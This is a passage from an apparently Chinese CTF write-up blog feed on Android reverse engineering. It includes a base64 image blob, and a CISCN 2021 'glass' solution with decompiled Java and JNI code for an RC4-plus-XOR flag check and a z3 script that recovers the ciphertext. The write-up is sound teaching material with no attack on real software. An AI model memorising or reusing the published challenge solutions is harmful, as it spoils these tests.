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&quot;</span>.split(<span class="string">&quot;,&quot;</span>)[<span class="number">1</span>];</span><br><span class="line">        <span class="type">byte</span>[] imageBytes = Base64.decode(imageString, <span class="number">0</span>);</span><br><span class="line">        <span class="type">Bitmap</span> <span class="variable">decodedImage</span> <span class="operator">=</span> BitmapFactory.decodeByteArray(imageBytes, <span class="number">0</span>, imageBytes.length);</span><br><span class="line">        image.setImageBitmap(decodedImage);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>r2d2中存了个base64编码的图片，解码看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306071404442.png"
                      alt="image-20230607140448311"
                ></p>
<p>得到了flag</p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>CISCN 2021初赛glass</title>
    <url>/2023/06/17/CTF%20WP/Re/%E5%AE%89%E5%8D%93/CISCN%202021%E5%88%9D%E8%B5%9Bglass/</url>
    <content><![CDATA[<p>查看组件，就一个activity，直接看</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.ciscn.glass&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;15&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/AppTheme&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.ciscn.glass.MainActivity&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>是一个标准的调用JNI接口的校验</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ciscn.glass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    Button but;</span><br><span class="line">    EditText txt;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">boolean</span> <span class="title function_">checkFlag</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(C0273R.layout.activity_main);</span><br><span class="line">        <span class="built_in">this</span>.but = (Button) findViewById(C0273R.C0275id.button);</span><br><span class="line">        <span class="built_in">this</span>.txt = (EditText) findViewById(C0273R.C0275id.editText);</span><br><span class="line">        <span class="built_in">this</span>.but.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.ciscn.glass.MainActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                <span class="type">MainActivity</span> <span class="variable">mainActivity</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>;</span><br><span class="line">                <span class="keyword">if</span> (mainActivity.checkFlag(mainActivity.txt.getText().toString())) <span class="comment">//校验flag</span></span><br><span class="line">                &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;right!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>, <span class="string">&quot;wrong!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>JNI中的checkFlag函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">Java_com_ciscn_glass_MainActivity_checkFlag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> length; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> key[<span class="number">256</span>]; <span class="comment">// [sp+0h] [bp-220h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">260</span>]; <span class="comment">// [sp+100h] [bp-120h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="type">const</span> <span class="type">char</span> *)sub_F0C(a1, a3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v3) != <span class="number">39</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  qmemcpy(key, <span class="string">&quot;12345678&quot;</span>, <span class="keyword">sizeof</span>(key));</span><br><span class="line">  length = <span class="built_in">strlen</span>(key);                         <span class="comment">// 8</span></span><br><span class="line">  sub_FFC(v7, (<span class="type">int</span>)key, length);</span><br><span class="line">  sub_1088(v7, v3, <span class="number">39</span>);</span><br><span class="line">  sub_10D4(v3, <span class="number">39</span>, key, length);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(v3, &amp;unk_497C, <span class="number">0x27</span>u) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/****************************下面是rc4加密的函数，key是上方的“12345678”********************************************/</span></span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_FFC</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r3</span></span><br><span class="line">  _BYTE v12[<span class="number">260</span>]; <span class="comment">// [sp+0h] [bp-120h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v12, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">256</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[i] = i;</span><br><span class="line">    sub_126C(i, a3);</span><br><span class="line">    v12[i] = a2[v7];</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v8 != <span class="number">256</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (<span class="type">unsigned</span> __int8)a1[v8];</span><br><span class="line">    v9 = (v9 + v10 + (<span class="type">unsigned</span> __int8)v12[v8]) % <span class="number">256</span>;</span><br><span class="line">    a1[v8++] = a1[v9];</span><br><span class="line">    a1[v9] = v10;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> _stack_chk_guard;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_1088</span><span class="params">(<span class="type">char</span> *result, <span class="type">char</span> *a2, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r5</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( length )</span><br><span class="line">  &#123;</span><br><span class="line">    --length;</span><br><span class="line">    v4 = (v4 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v5 = (<span class="type">unsigned</span> __int8)result[v4];</span><br><span class="line">    v3 = (v3 + v5) % <span class="number">256</span>;</span><br><span class="line">    result[v4] = result[v3];</span><br><span class="line">    result[v3] = v5;</span><br><span class="line">    *a2++ ^= result[(<span class="type">unsigned</span> __int8)(v5 + result[v4])];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**********************************************与明文校验前的混淆函数*********************************************/</span></span><br><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_10D4</span><span class="params">(<span class="type">char</span> *result, <span class="type">int</span> length, <span class="type">char</span> *key, <span class="type">int</span> keylength)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> *v5; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// lr</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// r12</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// lr</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// r6</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; length; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = &amp;result[i];</span><br><span class="line">    v6 = result[i + <span class="number">2</span>];</span><br><span class="line">    v7 = result[i + <span class="number">1</span>];</span><br><span class="line">    v8 = result[i] ^ v6;</span><br><span class="line">    result[i] = v8;</span><br><span class="line">    v5[<span class="number">2</span>] = v6 ^ v7;</span><br><span class="line">    v5[<span class="number">1</span>] = v7 ^ v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; length; j += keylength )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; (keylength &amp; ~(keylength &gt;&gt; <span class="number">31</span>)) != k &amp;&amp; j + k &lt; length; ++k )</span><br><span class="line">      result[k] ^= key[k];</span><br><span class="line">    result += keylength;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>写了个python脚本用于求解混淆前的rc4密文</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_10d4</span>(<span class="params">result,length,key,keylength</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,length,<span class="number">3</span>):</span><br><span class="line">		v6=result[i+<span class="number">2</span>]</span><br><span class="line">		v7=result[i+<span class="number">1</span>]</span><br><span class="line">		v8=result[i]^v6</span><br><span class="line">		result[i]=v8</span><br><span class="line">		result[i+<span class="number">2</span>]=v6^v7</span><br><span class="line">		result[i+<span class="number">1</span>]=v7^v8</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,length,keylength):</span><br><span class="line">		k=<span class="number">0</span></span><br><span class="line">		<span class="keyword">while</span>((keylength&amp;~(keylength&gt;&gt;<span class="number">31</span>)!=k)<span class="keyword">and</span> j+k&lt;length):</span><br><span class="line">			result[k+j]^=<span class="built_in">ord</span>(key[k])</span><br><span class="line">			k+=<span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag[%2d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>)]  <span class="comment">#初始化序列</span></span><br><span class="line">cmp=[<span class="number">0xA3</span>,<span class="number">0x1A</span>,<span class="number">0xE3</span>,<span class="number">0x69</span> ,<span class="number">0x2F</span> </span><br><span class="line">,<span class="number">0xBB</span>,<span class="number">0x1A</span>,<span class="number">0x84</span>,<span class="number">0x65</span> ,<span class="number">0xC2</span></span><br><span class="line">,<span class="number">0xAD</span>,<span class="number">0xAD</span>,<span class="number">0x9E</span>,<span class="number">0x96</span>,   <span class="number">5</span></span><br><span class="line">,   <span class="number">2</span>,<span class="number">0x1F</span>,<span class="number">0x8E</span>,<span class="number">0x36</span> ,<span class="number">0x4F</span> </span><br><span class="line">,<span class="number">0xE1</span>,<span class="number">0xEB</span>,<span class="number">0xAF</span>,<span class="number">0xF0</span>,<span class="number">0xEA</span></span><br><span class="line">,<span class="number">0xC4</span>,<span class="number">0xA8</span>,<span class="number">0x2D</span> ,<span class="number">0x42</span> ,<span class="number">0xC7</span></span><br><span class="line">,<span class="number">0x6E</span> ,<span class="number">0x3F</span> ,<span class="number">0xB0</span>,<span class="number">0xD3</span>,<span class="number">0xCC</span></span><br><span class="line">,<span class="number">0x78</span> ,<span class="number">0xF9</span>,<span class="number">0x98</span>,<span class="number">0x3F</span> ,   <span class="number">0</span>]</span><br><span class="line">out=[<span class="number">0</span>]*<span class="number">39</span></span><br><span class="line">f=Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">	out[i]=flag[i]</span><br><span class="line">out=sub_10d4(out,<span class="number">39</span>,<span class="string">&quot;12345678&quot;</span>,<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">	f.add(out[i]==cmp[i])</span><br><span class="line"><span class="keyword">if</span>(f.check()==sat):</span><br><span class="line">	m = f.model()</span><br><span class="line">	str1=<span class="string">&#x27;[&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">		str1+=<span class="string">&#x27;&#123;:0&gt;2X&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(m[flag[i]])))+<span class="string">&#x27; &#x27;</span></span><br><span class="line">	str1+=<span class="string">&#x27;]&#x27;</span></span><br><span class="line">	<span class="built_in">print</span>(str1)</span><br><span class="line">  <span class="comment">#str1=[F8 BA 6A 97 47 CA E8 91 C5 07 6E F7 92 0B 39 92 14 A8 AF 7E AA 50 45 8D 6D 2D B6 86 6E 9F 86 5E DF B3 1E 52 A6 62 6A ]</span></span><br></pre></td></tr></table></figure></div>

<p>直接拿去rc4解密就行，key是12345678</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/runwu2204/Blog_imgs/202306170057136.png"
                      alt="image-20230617005742016"
                ></p>
]]></content>
      <categories>
        <category>CTF WP</category>
        <category>Re</category>
        <category>安卓</category>
      </categories>
  </entry>
  <entry>
    <title>GKCTF 2021App-debug</title>
    <url>/2023/06/23/CTF%20WP/Re/%E5%AE%89%E5%8D%93/GKCTF%202021App-debug/</url>
    <content><![CDATA[<p>参考wp[(41条消息) BUUCTF <a class="link"   href="https://blog.csdn.net/weixin_53349587/article/details/122394778" >GKCTF 2021]app-debug_皮皮蟹！的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>就一个activity</p>
